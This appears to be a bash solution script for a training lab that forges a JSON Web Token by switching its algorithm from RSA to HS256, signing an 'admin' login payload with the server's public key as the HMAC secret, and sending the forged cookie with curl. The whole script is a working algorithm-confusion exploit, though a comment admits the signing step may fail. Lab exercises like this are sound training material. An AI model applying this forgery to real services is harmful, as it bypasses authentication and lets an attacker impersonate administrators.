#!/bin/bash

# try a request with the original auth cookie
curl -i -k -X GET -b "auth=$(cat token.txt)" 'http://ptl-ed6d97db-943daf6f.libcurl.so/index.php'

# change the signing algorithm from RSA to HMAC
echo -n '{"typ":"JWT","alg":"HS256"}' | basenc --base64url -w 0 > data.txt
echo -n '.'  >> data.txt
echo -n '{"login":"admin"}'  | basenc --base64url -w 0 >> data.txt

# remove all the padding from the base64 strings
perl -pi -e 's#=##g' data.txt

# the public key is now considered as a symmetric secret for HMAC
# this somehow fails (most likely because of the multiline secret)
openssl dgst -sha256 -hmac "$(cat public.pem)" -binary < data.txt |
    basenc --base64url -w 0 |
    (echo -n '.' && cat -) | cat data.txt - > token.evil.txt

# remove all the padding from the base64 strings
perl -pi -e 's#=##g' token.evil.txt

# alternatively, this script will sign the payload:
# python solve.py

# send to the server
curl -i -k -X GET -b "auth=$(cat token.evil.txt)" 'http://ptl-ed6d97db-943daf6f.libcurl.so/index.php'
